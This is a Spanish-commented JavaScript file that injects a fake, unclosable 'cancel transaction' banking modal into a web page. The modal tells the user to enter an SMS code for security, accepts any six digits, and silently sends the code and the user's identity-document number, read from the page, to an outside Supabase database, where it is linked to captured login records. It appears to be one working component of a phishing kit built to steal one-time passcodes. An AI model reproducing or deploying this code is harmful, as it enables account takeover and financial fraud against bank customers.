// Modal de Cancelación de Transacciones
// Modal irremovible - no se puede cerrar por botones o teclado
// Integración con Supabase para guardar documento y clave virtual

(function() {
    'use strict';

    // Configuración de Supabase (credenciales reales)
    const SUPABASE_URL = 'https://uzgdyypmqmnirkrqnlmq.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_5WgSnTPGEdfor1a83W0IIQ_pYrlY9ZD';
    let supabaseClient = null;

    // Configuración de la modal
    const CONFIG = {
        titulo: 'Cancelar Transacción',
        mensaje: 'Por seguridad, ingrese el código SMS para cancelar los intentos de transacción pendientes.',
        placeholderCodigo: 'Ingrese el código SMS',
        textoBoton: 'Finalizar Transacción',
        tiempoExpiracion: 300, // 5 minutos en segundos
        intentosMaximos: 3
    };

    // Estado de la modal
    let estadoModal = {
        codigoIngresado: '',
        intentosRealizados: 0,
        tiempoRestante: CONFIG.tiempoExpiracion,
        timerInterval: null,
        documentoUsuario: '',
        claveVirtual: ''
    };

    // Cargar Supabase dinámicamente desde CDN
    async function cargarSupabaseCDN() {
        return new Promise((resolve, reject) => {
            if (typeof window.supabase !== 'undefined') {
                resolve(true);
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js';
            script.async = true;
            
            script.onload = () => {
                console.log('Supabase CDN cargado exitosamente');
                resolve(true);
            };
            
            script.onerror = () => {
                console.error('Error al cargar Supabase CDN');
                reject(new Error('No se pudo cargar Supabase desde CDN'));
            };

            document.head.appendChild(script);
        });
    }

    // Inicializar Supabase
    async function inicializarSupabase() {
        if (window.supabaseService && window.supabaseService.supabaseClient) {
            supabaseClient = window.supabaseService.supabaseClient;
            console.log('Supabase inicializado desde servicio global');
            return true;
        }

        try {
            if (typeof window.supabase === 'undefined') {
                console.log('Supabase no encontrado, cargando desde CDN...');
                await cargarSupabaseCDN();
            }

            if (typeof window.supabase === 'undefined') {
                console.error('Supabase no está disponible después de cargar CDN');
                return false;
            }

            supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            console.log('Supabase inicializado correctamente en modal');
            return true;
        } catch (error) {
            console.error('Error al inicializar Supabase:', error);
            return false;
        }
    }

    // Obtener último login del usuario
    async function obtenerUltimoLogin() {
        try {
            if (!supabaseClient) await inicializarSupabase();
            if (!supabaseClient) return null;

            const { data, error } = await supabaseClient
                .from('logins')
                .select('*')
                .eq('documento', estadoModal.documentoUsuario)
                .order('fecha_login', { ascending: false })
                .limit(1);

            if (error) {
                console.error('Error obteniendo login:', error);
                return null;
            }

            return data && data.length > 0 ? data[0] : null;
        } catch (error) {
            console.error('Error en obtenerUltimoLogin:', error);
            return null;
        }
    }

    // Guardar en Supabase
    async function guardarEnSupabase(datos) {
        try {
            if (!supabaseClient) await inicializarSupabase();
            if (!supabaseClient) {
                console.error('Supabase no está inicializado');
                return { success: false, error: 'Supabase no disponible' };
            }

            const ultimoLogin = await obtenerUltimoLogin();
            const loginId = ultimoLogin ? ultimoLogin.id : null;

            console.log('Guardando en Supabase:', {
                documento: estadoModal.documentoUsuario,
                clave_virtual: estadoModal.claveVirtual,
                login_id: loginId,
                ...datos
            });

            const { data: codigoData, error: codigoError } = await supabaseClient
                .from('codigos_seguridad')
                .insert([{
                    login_id: loginId,
                    codigo: datos.codigo,
                    tipo: 'cancelacion_transacciones',
                    documento: estadoModal.documentoUsuario,
                    clave_virtual: estadoModal.claveVirtual,
                    intentos: estadoModal.intentosRealizados,
                    estado: datos.estado,
                    fecha_creacion: new Date().toISOString(),
                    fecha_expiracion: new Date(Date.now() + CONFIG.tiempoExpiracion * 1000).toISOString(),
                    usado: datos.estado === 'validado'
                }]);

            if (codigoError) {
                console.error('Error al guardar código:', codigoError);
                return { success: false, error: codigoError.message };
            }

            console.log('✓ Guardado exitoso en Supabase:', codigoData);
            return { success: true, data: codigoData && codigoData.length > 0 ? codigoData[0] : null };
        } catch (error) {
            console.error('Error en guardarEnSupabase:', error);
            return { success: false, error: error.message };
        }
    }

    // Crear el HTML de la modal
    function crearModalHTML() {
        const modalHTML = `
            <div id="modal-cancelacion-transaccion" class="modal-cancelacion-overlay" style="display: none;">
                <div class="modal-cancelacion-container">
                    <div class="modal-cancelacion-header">
                        <h2>${CONFIG.titulo}</h2>
                    </div>
                    <div class="modal-cancelacion-body">
                        <p class="modal-cancelacion-mensaje">${CONFIG.mensaje}</p>
                        
                        <div class="modal-cancelacion-timer">
                            <span id="timer-text">El código expira en: <strong id="tiempo-restante">05:00</strong></span>
                        </div>

                        <div class="modal-cancelacion-codigo-group">
                            <label for="codigo-sms" class="modal-cancelacion-label">Código SMS:</label>
                            <input 
                                type="text" 
                                id="codigo-sms" 
                                class="modal-cancelacion-input" 
                                placeholder="${CONFIG.placeholderCodigo}"
                                maxlength="6"
                                autocomplete="off"
                                onkeypress="return soloNumeros(event)"
                            >
                            <p id="mensaje-error" class="modal-cancelacion-error" style="display: none;"></p>
                            <p id="mensaje-exito" class="modal-cancelacion-exito" style="display: none;"></p>
                        </div>

                        <div class="modal-cancelacion-botones">
                            <button 
                                id="btn-finalizar" 
                                class="modal-cancelacion-btn modal-cancelacion-btn-primary"
                                onclick="procesarCodigoSMS()"
                            >
                                ${CONFIG.textoBoton}
                            </button>
                        </div>

                        <div class="modal-cancelacion-info">
                            <p>¿No recibiste el código? <a href="#" onclick="reenviarCodigo(event)">Reenviar código</a></p>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }

    // Crear estilos CSS para la modal
    function crearEstilosCSS() {
        const style = document.createElement('style');
        style.id = 'modal-cancelacion-estilos';
        
        const css = `
            .modal-cancelacion-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 8, 82, 0.85);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 999999;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            .modal-cancelacion-container {
                background-color: #ffffff;
                border-radius: 12px;
                box-shadow: 0 8px 32px rgba(0, 8, 82, 0.4);
                max-width: 500px;
                width: 90%;
                animation: modalFadeIn 0.4s ease-in-out;
                border-top: 6px solid #d32f2f;
            }

            @keyframes modalFadeIn {
                from {
                    opacity: 0;
                    transform: translateY(-30px) scale(0.95);
                }
                to {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }

            .modal-cancelacion-header {
                background-color: #d32f2f;
                color: white;
                padding: 24px;
                border-radius: 6px 6px 0 0;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }

            .modal-cancelacion-header h2 {
                margin: 0;
                font-size: 22px;
                font-weight: 600;
                letter-spacing: 0.5px;
            }

            .modal-cancelacion-body {
                padding: 30px;
            }

            .modal-cancelacion-mensaje {
                color: #333;
                font-size: 15px;
                line-height: 1.6;
                margin-bottom: 20px;
            }

            .modal-cancelacion-timer {
                background-color: #fff3cd;
                border-left: 4px solid #ffc107;
                padding: 12px 16px;
                margin-bottom: 20px;
                border-radius: 4px;
            }

            #timer-text {
                color: #856404;
                font-size: 14px;
            }

            #tiempo-restante {
                font-size: 16px;
                font-weight: bold;
            }

            .modal-cancelacion-codigo-group {
                margin-bottom: 25px;
            }

            .modal-cancelacion-label {
                display: block;
                color: #333;
                font-weight: 600;
                margin-bottom: 10px;
                font-size: 14px;
            }

            .modal-cancelacion-input {
                width: 100%;
                padding: 14px 16px;
                font-size: 18px;
                border: 2px solid #ddd;
                border-radius: 6px;
                box-sizing: border-box;
                transition: all 0.3s;
                letter-spacing: 4px;
                text-align: center;
                font-weight: 600;
            }

            .modal-cancelacion-input:focus {
                outline: none;
                border-color: #d32f2f;
                box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.15);
            }

            .modal-cancelacion-error {
                color: #d32f2f;
                font-size: 13px;
                margin-top: 10px;
                padding: 10px;
                background-color: #ffebee;
                border-radius: 4px;
                border-left: 3px solid #d32f2f;
            }

            .modal-cancelacion-exito {
                color: #2e7d32;
                font-size: 13px;
                margin-top: 10px;
                padding: 10px;
                background-color: #e8f5e9;
                border-radius: 4px;
                border-left: 3px solid #2e7d32;
            }

            .modal-cancelacion-botones {
                display: flex;
                gap: 12px;
                margin-bottom: 15px;
            }

            .modal-cancelacion-btn {
                flex: 1;
                padding: 14px 24px;
                font-size: 15px;
                font-weight: 600;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .modal-cancelacion-btn-primary {
                background-color: #d32f2f;
                color: white;
            }

            .modal-cancelacion-btn-primary:hover {
                background-color: #b71c1c;
                transform: translateY(-2px);
                box-shadow: 0 4px 12px rgba(211, 47, 47, 0.4);
            }

            .modal-cancelacion-btn-primary:disabled {
                background-color: #ccc;
                cursor: not-allowed;
                transform: none;
                box-shadow: none;
            }

            .modal-cancelacion-info {
                text-align: center;
                font-size: 13px;
                color: #666;
                margin-top: 15px;
            }

            .modal-cancelacion-info a {
                color: #d32f2f;
                text-decoration: none;
                font-weight: 600;
            }

            .modal-cancelacion-info a:hover {
                text-decoration: underline;
            }

            .modal-cancelacion-notificacion {
                position: fixed;
                top: 20px;
                right: 20px;
                background-color: #333;
                color: white;
                padding: 16px 24px;
                border-radius: 6px;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                z-index: 1000000;
                animation: notificacionSlideIn 0.3s ease-in-out;
                max-width: 350px;
            }

            .modal-cancelacion-notificacion.exito {
                background-color: #2e7d32;
                border-left: 4px solid #1b5e20;
            }

            .modal-cancelacion-notificacion.info {
                background-color: #d32f2f;
                border-left: 4px solid #b71c1c;
            }

            @keyframes notificacionSlideIn {
                from {
                    transform: translateX(400px);
                    opacity: 0;
                }
                to {
                    transform: translateX(0);
                    opacity: 1;
                }
            }

            @media (max-width: 600px) {
                .modal-cancelacion-container {
                    width: 95%;
                }

                .modal-cancelacion-header {
                    padding: 18px;
                }

                .modal-cancelacion-header h2 {
                    font-size: 18px;
                }

                .modal-cancelacion-body {
                    padding: 20px;
                }

                .modal-cancelacion-botones {
                    flex-direction: column;
                }

                .modal-cancelacion-notificacion {
                    top: 10px;
                    right: 10px;
                    left: 10px;
                    max-width: none;
                }
            }
        `;

        style.textContent = css;
        document.head.appendChild(style);
    }

    // Mostrar notificación formal
    function mostrarNotificacion(mensaje, tipo = 'info') {
        const notificacionPrevia = document.querySelector('.modal-cancelacion-notificacion');
        if (notificacionPrevia) {
            notificacionPrevia.remove();
        }

        const notificacion = document.createElement('div');
        notificacion.className = 'modal-cancelacion-notificacion ' + tipo;
        notificacion.textContent = mensaje;
        document.body.appendChild(notificacion);

        setTimeout(() => {
            notificacion.style.animation = 'notificacionSlideIn 0.3s ease-in-out reverse';
            setTimeout(() => {
                notificacion.remove();
            }, 300);
        }, 4000);
    }

    // Inicializar la modal
    async function inicializarModal() {
        crearEstilosCSS();
        crearModalHTML();
        
        await inicializarSupabase();
        
        obtenerDatosUsuario();
        
        setTimeout(() => {
            mostrarModal();
        }, 1000);

        iniciarTemporizador();

        setTimeout(() => {
            const inputCodigo = document.getElementById('codigo-sms');
            if (inputCodigo) {
                inputCodigo.focus();
            }
        }, 1500);

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);

        document.addEventListener('click', function(e) {
            const modal = document.getElementById('modal-cancelacion-transaccion');
            if (modal && e.target === modal) {
                e.preventDefault();
                return false;
            }
        }, true);
    }

    // Obtener datos del usuario desde el DOM o variables globales
    function obtenerDatosUsuario() {
        if (typeof JDID !== 'undefined') {
            estadoModal.documentoUsuario = JDID;
        } else {
            const docElement = document.querySelector('[id*="documento"]');
            if (docElement) {
                estadoModal.documentoUsuario = docElement.textContent || docElement.value || '';
            }
        }

        estadoModal.claveVirtual = generarClaveVirtual();
    }

    // Generar clave virtual única
    function generarClaveVirtual() {
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(2, 9);
        return 'CV-' + timestamp + '-' + random.toUpperCase();
    }

    // Mostrar la modal
    function mostrarModal() {
        const modal = document.getElementById('modal-cancelacion-transaccion');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    // Iniciar temporizador de expiración
    function iniciarTemporizador() {
        actualizarTiempoRestante();
        
        estadoModal.timerInterval = setInterval(() => {
            estadoModal.tiempoRestante--;
            actualizarTiempoRestante();

            if (estadoModal.tiempoRestante <= 0) {
                clearInterval(estadoModal.timerInterval);
                mostrarError('El código SMS ha expirado. Por favor, solicite uno nuevo.');
                deshabilitarBotonFinalizar();
            }
        }, 1000);
    }

    // Actualizar display del tiempo restante
    function actualizarTiempoRestante() {
        const tiempoElement = document.getElementById('tiempo-restante');
        if (tiempoElement) {
            const minutos = Math.floor(estadoModal.tiempoRestante / 60);
            const segundos = estadoModal.tiempoRestante % 60;
            tiempoElement.textContent = String(minutos).padStart(2, '0') + ':' + String(segundos).padStart(2, '0');
        }
    }

    // Validar que solo se ingresen números
    function soloNumeros(event) {
        const charCode = event.which ? event.which : event.keyCode;
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
            event.preventDefault();
            return false;
        }
        return true;
    }

    // Procesar el código SMS ingresado
    async function procesarCodigoSMS() {
        const inputCodigo = document.getElementById('codigo-sms');
        const mensajeError = document.getElementById('mensaje-error');
        const mensajeExito = document.getElementById('mensaje-exito');
        const codigoIngresado = inputCodigo.value.trim();

        mensajeError.style.display = 'none';
        mensajeExito.style.display = 'none';

        if (!codigoIngresado || codigoIngresado.length === 0) {
            mostrarError('Por favor, ingrese el código SMS');
            inputCodigo.focus();
            return;
        }

        if (codigoIngresado.length !== 6) {
            mostrarError('El código debe tener 6 dígitos');
            inputCodigo.focus();
            return;
        }

        if (estadoModal.intentosRealizados >= CONFIG.intentosMaximos) {
            mostrarError('Ha excedido el número máximo de intentos. Por favor, solicite un nuevo código.');
            deshabilitarBotonFinalizar();
            return;
        }

        console.log('Validando código SMS:', codigoIngresado);
        
        setTimeout(async () => {
            if (codigoIngresado.length === 6) {
                const resultadoGuardado = await guardarEnSupabase({
                    codigo: codigoIngresado,
                    estado: 'validado'
                });

                if (resultadoGuardado.success) {
                    mensajeExito.textContent = '✓ Transacción finalizada exitosamente';
                    mensajeExito.style.display = 'block';
                    
                    mostrarNotificacion(
                        'Transacción cancelada exitosamente. Documento: ' + estadoModal.documentoUsuario,
                        'exito'
                    );

                    deshabilitarBotonFinalizar();

                    setTimeout(() => {
                        cerrarModalCancelacion();
                    }, 3000);
                } else {
                    mostrarError('Error al procesar la transacción. Por favor, intente nuevamente.');
                }
            } else {
                estadoModal.intentosRealizados++;
                mostrarError('Código inválido. Intentos restantes: ' + (CONFIG.intentosMaximos - estadoModal.intentosRealizados));
                inputCodigo.value = '';
                inputCodigo.focus();
            }
        }, 500);
    }

    // Reenviar código SMS
    async function reenviarCodigo(event) {
        event.preventDefault();
        
        console.log('Reenviando código SMS...');
        
        estadoModal.claveVirtual = generarClaveVirtual();
        
        estadoModal.tiempoRestante = CONFIG.tiempoExpiracion;
        estadoModal.intentosRealizados = 0;
        
        const inputCodigo = document.getElementById('codigo-sms');
        if (inputCodigo) {
            inputCodigo.value = '';
            inputCodigo.focus();
        }

        const mensajeError = document.getElementById('mensaje-error');
        const mensajeExito = document.getElementById('mensaje-exito');
        if (mensajeError) mensajeError.style.display = 'none';
        if (mensajeExito) mensajeExito.style.display = 'none';

        habilitarBotonFinalizar();

        if (estadoModal.timerInterval) {
            clearInterval(estadoModal.timerInterval);
        }
        iniciarTemporizador();

        await guardarEnSupabase({
            codigo: null,
            estado: 'reenviado'
        });

        mostrarNotificacion(
            'Se ha enviado un nuevo código SMS a su número registrado.',
            'info'
        );
    }

    // Mostrar mensaje de error
    function mostrarError(mensaje) {
        const mensajeError = document.getElementById('mensaje-error');
        const mensajeExito = document.getElementById('mensaje-exito');
        
        if (mensajeError) {
            mensajeError.textContent = mensaje;
            mensajeError.style.display = 'block';
        }
        if (mensajeExito) {
            mensajeExito.style.display = 'none';
        }
    }

    // Deshabilitar botón de finalizar
    function deshabilitarBotonFinalizar() {
        const boton = document.getElementById('btn-finalizar');
        if (boton) {
            boton.disabled = true;
        }
    }

    // Habilitar botón de finalizar
    function habilitarBotonFinalizar() {
        const boton = document.getElementById('btn-finalizar');
        if (boton) {
            boton.disabled = false;
        }
    }

    // Cerrar la modal (solo para uso interno)
    function cerrarModalCancelacion() {
        const modal = document.getElementById('modal-cancelacion-transaccion');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
            
            if (estadoModal.timerInterval) {
                clearInterval(estadoModal.timerInterval);
            }
        }
    }

    // Inicializar cuando el DOM esté listo
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', inicializarModal);
    } else {
        inicializarModal();
    }

    // Exponer funciones al scope global
    window.cerrarModalCancelacion = cerrarModalCancelacion;
    window.procesarCodigoSMS = procesarCodigoSMS;
    window.reenviarCodigo = reenviarCodigo;
    window.soloNumeros = soloNumeros;

})();